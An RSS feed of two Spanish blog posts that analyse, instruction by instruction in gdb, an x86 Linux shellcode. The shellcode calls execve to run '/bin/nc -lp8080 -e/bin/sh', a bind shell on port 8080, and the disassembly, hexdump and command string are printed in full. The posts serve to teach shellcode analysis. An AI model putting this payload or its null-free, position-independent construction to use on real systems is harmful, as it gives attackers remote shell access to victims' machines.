<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="../assets/xml/rss.xsl" media="all"?><rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0"><channel><title>deibit (exploiting)</title><link>http://deibit.com/</link><description></description><atom:link href="http://deibit.com/categories/exploiting.xml" rel="self" type="application/rss+xml"></atom:link><language>en</language><lastBuildDate>Thu, 21 Jul 2016 20:59:49 GMT</lastBuildDate><generator>https://getnikola.com/</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>Analizando un shellcode (III)</title><link>http://deibit.com/posts/2011/04/13/analizando-un-shellcode-iii/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Hasta ahora hemos visto como está estructurado el shellcode y como se produce la llamada al sistema. También hemos comentado como se produce un salto hacia el final (donde se encuentra “/bin/nc -lp8080 -e/bin/sh”) y vuelta hacia delante para obtener un pivote hacia la cadena.&lt;/p&gt;
&lt;p&gt;Vamos a ver como se ejecutan las instrucciones del shellcode para elaborar los argumentos que faltan y para pasarlos a la llamada al sistema. Recordemos que esta llamada al sistema precisa de 3 argumentos:&lt;/p&gt;
&lt;p&gt;[sourcecode language="cpp"]&lt;br&gt;
int execve(const char *filename, char *const argv[], char *const envp[]);&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Filename&lt;/strong&gt;: un nombre de archivo (un puntero a una cadena)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;argv&lt;/strong&gt;:        un puntero a un array de punteros a char (cadenas) que serán los argumentos a pasar al programa.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;envp&lt;/strong&gt;:       un puntero a un array de punteros a char (más cadenas) donde podemos pasar variables de entorno para el proceso a crear.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Y ahora dos preguntas:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;¿No deben los arrays de punteros a cadenas terminar con un ’0′ cada cadena?&lt;br&gt;
¿No deben no contener el carácter ’0′ los shellcodes?&lt;/p&gt;
&lt;p&gt;Esto es lo que hace el resto del código que aun no hemos comentado aun, modificar la cadena que ya está en memoria para ir creando los caracteres que faltan e ir posicionando las partes precisas para que luego las podamos meter en los registros que van a servir para la llamada la sistema.&lt;/p&gt;
&lt;p&gt;Y aquí también es donde entra la magia o arte del shellcoding: cuantas menos instrucciones más pequeño y cuanto más pequeño mejor.&lt;/p&gt;
&lt;p&gt;Bien, tenemos el código:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
(gdb) x/30i shellcode&lt;br&gt;
   0x804a040 &amp;lt;shellcode&amp;gt;:	jmp    0x804a06c &amp;lt;shellcode+44&amp;gt;&lt;br&gt;
   0x804a042 &amp;lt;shellcode+2&amp;gt;:	pop    %esi&lt;br&gt;
   0x804a043 &amp;lt;shellcode+3&amp;gt;:	xor    %eax,%eax&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das              &amp;lt;——————- COMIENZO DE CADENA&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;y tenemos la cadena:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
00001070  ff 2f 62 69 6e 2f 6e 63  23 2d 6c 70 38 30 38 30  |./bin/nc#-lp8080|&lt;br&gt;
00001080  23 2d 65 2f 62 69 6e 2f  73 68 23 00 44 69 72 3a  |#-e/bin/sh#.Dir:|&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Esto último es la salida del comando hexdump, donde el carácter ‘/’ que en hexadecimal es ’2f’. La dirección de comienzo de la cadena será: 0x804a071. Esta dirección, lo volvemos a repetir, la conoce el shellcode al saltar hacia “call 0x804a042″, se produce la llamada y se carga en la pila la dirección de retorno que es exactamente donde empieza la cadena. Al ir a la dirección de la llamada lo primero que se hace es pop a ESI donde se carga esta dirección. Es en este registro donde tenemos el pivote hacia la cadena.&lt;/p&gt;
&lt;p&gt;La siguiente instrucción es un “xor %eax,%eax” que no es otra cosa que poner a ’0′ el registro EAX. Ya tenemos el cero que andábamos buscando.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Siguientes instrucciones:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
[/sourcecode]&lt;br&gt;
”&lt;br&gt;
AL es el último byte (el de menor peso) del registro EAX, que tiene el valor de ’00′. Este valor va a ser “copiado” a ESI + 0x7, ESI + 0xF y ESI + 19.&lt;/p&gt;
&lt;p&gt;Como ESI vale 0x804a071 podemos hacer nuestras cuentas:&lt;/p&gt;
&lt;p&gt;0x804a071 + 0x7  =  0x804a079&lt;br&gt;
0x804a071 + 0xF  =  0x804a080&lt;br&gt;
0x804a071 + 0x19 = 0x804a08A&lt;/p&gt;
&lt;p&gt;Direcciones que se corresponden con las letras de la cadena: primer ‘#’, segundo ‘#’ y tercer ‘#’. Prácticamente un reemplazo de los caracteres ‘#’ por ’0′.&lt;/p&gt;
&lt;p&gt;La cadena queda partida en 3 subcadenas: &lt;/p&gt;
&lt;p&gt;/bin/nc   -lp8080   -e/bin/sh&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Siguiente grupo:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Instrucción por instrucción:&lt;/p&gt;
&lt;p&gt;1.- Mueve el valor de ESI (dirección de comienzo de la cadena) al final de la cadena ESI+0x1A. Ojo, aquí tenemos una dirección que apunta a la primera subcadena: “/bin/nc”&lt;br&gt;
2.- Carga en EBX el valor de la dirección efectiva (Load Effective Address) de ESI+0x8. Que es donde comienza la siguiente subcadena: “-lp8080″ ¿No es un buen lugar para comenzar un array de cadenas?&lt;br&gt;
3.- Mueve a ESI+0x22 el valor de EBX. Ya tenemos al final de la cadena la dirección de la primera subcadena seguido de la dirección de la segunda.&lt;br&gt;
4.- Carga en EBX el valor de la dirección efectiva de ESI + 0x10. Esto nos deja en EBX la dirección 0x804a081 que es la subcadena “-e/bin/sh”&lt;br&gt;
5.- Mueve el valor que hay en EBX (la dirección de la ultima subcadena) a ESI+0x22. Ya tenemos al final de la cadena las 3 direcciones de las subcadenas.&lt;br&gt;
6.- Mueve EAX que vale 0x00000000 a ESI+0x26&lt;/p&gt;
&lt;p&gt;Al final terminamos con este layout al final de la cadena original del shellcode:&lt;/p&gt;
&lt;p&gt;FINAL DE LA CADENA | DIRECCIÓN PRIMERA SUBCADENA | DIRECCIÓN SEGUNDA SUBCADENA | DIRECCIÓN ULTIMA SUBCADENA | 0x00000000&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Cargamos parámetros para la llamada al sistema&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;1.- En AL cargamos el valor 0xb que es 11 y que es el código de la llamada al sistema de “&lt;a href="http://linux.die.net/man/2/execve"&gt;execv&lt;/a&gt;”&lt;br&gt;
2.- Cargamos ESI en EBX para el primer parámetro que es el archivo a ejecutar. En este caso “/bin/nc” la herramienta NetCat.&lt;br&gt;
3.- Cargamos en ECX para el segundo parámetro el puntero a la siguiente subcadena que hará de puntero a array de cadenas y que contendrá los parámetros a pasar a NetCat que nos son otros que “-lp8080″ y “-e/bin/sh”.&lt;br&gt;
4.- Cargamos en EDX, el tercer parámetro para la llamada al sistema, el valor apuntado por ESI+0x26 que es como recordamos 0x00000000 o lo que es lo mismo, le estamos pasando un puntero nulo para decirle que no vamos a usar ese parámetro.&lt;br&gt;
5.- INT $0x80, sobran explicaciones: Si todo a ido bien esta interrupción le dice al núcleo que ejecute nuestra llamada y por lo tanto se cree un proceso que abrirá una shell a la escucha en el puerto 8080 de la máquina remota.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Tengo una bonita demostración para este shellcode pero no me queda espacio en este post. Lo dejo para otro.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Entradas anteriores&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://prisonernumbersix.com/2011/01/19/analizando-un-shellcode-i/"&gt;Analizando un shellcode I&lt;/a&gt;&lt;br&gt;
&lt;a href="http://prisonernumbersix.com/2011/02/12/analizando-un-shellcode-ii/"&gt;Analizando un shellcode II&lt;/a&gt;&lt;/p&gt;
</description><category>exploiting</category><category>linux</category><category>seguridad</category><category>shellcoding</category><guid>http://deibit.com/posts/2011/04/13/analizando-un-shellcode-iii/</guid><pubDate>Wed, 13 Apr 2011 19:02:44 GMT</pubDate></item><item><title>Analizando un shellcode (II)</title><link>http://deibit.com/posts/2011/02/12/analizando-un-shellcode-ii/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Tenemos el desemsamblado del programa (shellcode.c), vamos a ir viendo paso a paso la ejecución:&lt;/p&gt;
&lt;p&gt;En gris se encuentra resaltada la parte donde se encuentra la cadena “./bin/nc -lp8080 -e /bin/sh”&lt;/p&gt;
&lt;p&gt;[sourcecode highlight="20,21,22,23,24,25,26,27"]&lt;br&gt;
(gdb) x/38i shellcode&lt;br&gt;
   0x804a040 &amp;lt;shellcode&amp;gt;:	jmp    0x804a06c &amp;lt;shellcode+44&amp;gt;&lt;br&gt;
   0x804a042 &amp;lt;shellcode+2&amp;gt;:	pop    %esi&lt;br&gt;
   0x804a043 &amp;lt;shellcode+3&amp;gt;:	xor    %eax,%eax&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a077 &amp;lt;shellcode+55&amp;gt;:	arpl   %sp,(%ebx)&lt;br&gt;
   0x804a079 &amp;lt;shellcode+57&amp;gt;:	sub    $0x3038706c,%eax&lt;br&gt;
   0x804a07e &amp;lt;shellcode+62&amp;gt;:	cmp    %dh,(%eax)&lt;br&gt;
   0x804a080 &amp;lt;shellcode+64&amp;gt;:	and    0x69622f65,%ebp&lt;br&gt;
   0x804a086 &amp;lt;shellcode+70&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a087 &amp;lt;shellcode+71&amp;gt;:	das&lt;br&gt;
   0x804a088 &amp;lt;shellcode+72&amp;gt;:	jae    0x804a0f2&lt;br&gt;
   0x804a08a &amp;lt;shellcode+74&amp;gt;:	and    (%eax),%eax&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Una vez que se consigue explotar una vulnerabilidad y desviar el flujo de ejecución del programa hacia nuestro shellcode la primera instrucción es un salto:&lt;/p&gt;
&lt;p&gt;0x804a040 :   jmp    0x804a06c &lt;/p&gt;
&lt;p&gt;que lleva a una llamada:&lt;/p&gt;
&lt;p&gt;0x804a06c :     call   0x804a042 &lt;/p&gt;
&lt;p&gt;que vuelve a posicionarnos justo debajo del salto:&lt;/p&gt;
&lt;p&gt; 0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;¿Curioso no? ¿Para que tanto ir y volver si acabamos justo debajo de donde empezamos?&lt;/p&gt;
&lt;p&gt;Principalmente por dos razones:&lt;/p&gt;
&lt;p&gt;1.- Evitar bytes nulos ’0x00′. Esto se hace al efectuar el salto ‘jmp’. Si hubiésemos usado un call añadiríamos bytes nulos.&lt;br&gt;
2.- Necesitamos una referencia. Una dirección sobre la que pivotar. &lt;/p&gt;
&lt;p&gt;Respecto del primer punto es obvio y ya se comentó antes. El segundo tiene su explicación.&lt;/p&gt;
&lt;p&gt;Nuestro shellcode debe ser independiente de la posición donde se encuentre el código. Recordemos que nuestro código se va a ejecutar en la pila y que las direcciones de la pila cambiarán en cada ejecución debido al carácter dinámico de esta. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;¿Como obtener ese punto de referencia?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Al efectuar una llamada ‘call   0x804a042 ‘ se va a dejar en la pila la dirección de retorno para que cuando se vuelva de la llamada el flujo de ejecución prosiga. Ahora bien, si observamos…¿Que hay debajo de la llamada? &lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;La cadena “./bin/nc -lp8080 -e /bin/sh”.&lt;/p&gt;
&lt;p&gt;Por lo tanto ya tenemos en la pila, en una posición conocida, la dirección de la cadena para usarla como parámetro para la llamada al sistema.&lt;/p&gt;
&lt;p&gt;Ese pop que vimos:&lt;/p&gt;
&lt;p&gt; 0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;Va a almacenar la dirección de retorno que se a “pusheado” en la pila al efectuar la llamada en el registro “esi”.&lt;/p&gt;
&lt;p&gt;Vemos la secuencia con más detenimiento:&lt;/p&gt;
&lt;p&gt;Saltamos:&lt;br&gt;
0x804a040 :	jmp    0x804a06c &lt;/p&gt;
&lt;p&gt;Creamos la llamada, depositando la dirección de retorno en la pila:&lt;br&gt;
0x804a06c :     call   0x804a042 &lt;/p&gt;
&lt;p&gt;Y sacamos de la pila esa dirección almacenándola en “esi”:&lt;br&gt;
0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;La llamada al sistema &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;La finalidad última del shellcode estudiado es llamar al programa ‘netcat’ abriendo el puerto 8080 para poner en él a la escucha una shell.&lt;/p&gt;
&lt;p&gt;Esto lo hace a través de una syscall. Una llamada al sistema. &lt;/p&gt;
&lt;p&gt;En el código podemos situarla aquí:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Se cargan los parámetros en los registros eax, ebx, ecx y edx. Y se llama a la interrupción 0x80. Esta interrupción le indica al kernel que queremos efectuar una llamada al sistema. &lt;/p&gt;
&lt;p&gt;Exactamente qué llamada va a ir indicada en el registro eax. Y va a ir designada por un número definido por una constante en un fichero:&lt;/p&gt;
&lt;p&gt;(el fichero es unistd.h, pero en Ubuntu para 32 bits, por ejemplo, la veremos en la ruta indicada abajo)&lt;/p&gt;
&lt;p&gt;$ cat /usr/include/asm/unistd_32.h &lt;/p&gt;
&lt;p&gt;[sourcecode language="cpp" highlight="19"]&lt;br&gt;
#ifndef _ASM_X86_UNISTD_32_H&lt;br&gt;
#define _ASM_X86_UNISTD_32_H&lt;/p&gt;
&lt;p&gt;/*&lt;br&gt;
 * This file contains the system call numbers.&lt;br&gt;
 */&lt;/p&gt;
&lt;p&gt;#define __NR_restart_syscall      0&lt;br&gt;
#define __NR_exit		  1&lt;br&gt;
#define __NR_fork		  2&lt;br&gt;
#define __NR_read		  3&lt;br&gt;
#define __NR_write		  4&lt;br&gt;
#define __NR_open		  5&lt;br&gt;
#define __NR_close		  6&lt;br&gt;
#define __NR_waitpid		  7&lt;br&gt;
#define __NR_creat		  8&lt;br&gt;
#define __NR_link		  9&lt;br&gt;
#define __NR_unlink		 10&lt;br&gt;
#define __NR_execve		 11&lt;br&gt;
#define __NR_chdir		 12&lt;br&gt;
#define __NR_time		 13&lt;br&gt;
#define __NR_mknod		 14&lt;br&gt;
#define __NR_chmod		 15&lt;br&gt;
#define __NR_lchown		 16&lt;br&gt;
#define __NR_break		 17&lt;br&gt;
…&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Si observamos lo que estamos cargando en eax:&lt;/p&gt;
&lt;p&gt;  0x804a060 :	mov    $0xb,%al&lt;/p&gt;
&lt;p&gt;En decimal ’0xb’ es ’11′ lo que correspondería a:&lt;/p&gt;
&lt;p&gt;#define __NR_execve		 11&lt;/p&gt;
&lt;p&gt;la llamada al sistema execve. &lt;/p&gt;
&lt;p&gt;Si miramos su página man:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
EXECVE(2)                                          Linux Programmer’s Manual                                         EXECVE(2)&lt;/p&gt;
&lt;p&gt;NAME&lt;br&gt;
       execve – execute program&lt;/p&gt;
&lt;p&gt;SYNOPSIS&lt;br&gt;
       #include &amp;lt;unistd.h&amp;gt;&lt;/p&gt;
&lt;p&gt;       int execve(const char *filename, char *const argv[],&lt;br&gt;
                  char *const envp[]);&lt;/p&gt;
&lt;p&gt;DESCRIPTION&lt;br&gt;
       execve()  executes the program pointed to by filename.  filename must be either a binary executable, or a script start‐&lt;br&gt;
       ing with a line of the form:&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Vemos que necesita 3 parámetros: filename, argv y envp. Respectivamente, el nombre del programa, un array con los parámetros para ese programa y un array con las variables de entorno para ese programa que queramos fijar. &lt;/p&gt;
&lt;p&gt;Estos parámetros van a ir en los otros registros que hemos visto: ebx, ecx y edx.&lt;/p&gt;
&lt;p&gt;Más en la siguiente entrega.&lt;/p&gt;
</description><category>Basic</category><category>exploit</category><category>exploiting</category><category>gdb</category><category>seguridad</category><category>shellcode</category><guid>http://deibit.com/posts/2011/02/12/analizando-un-shellcode-ii/</guid><pubDate>Sat, 12 Feb 2011 09:45:22 GMT</pubDate></item></channel></rss>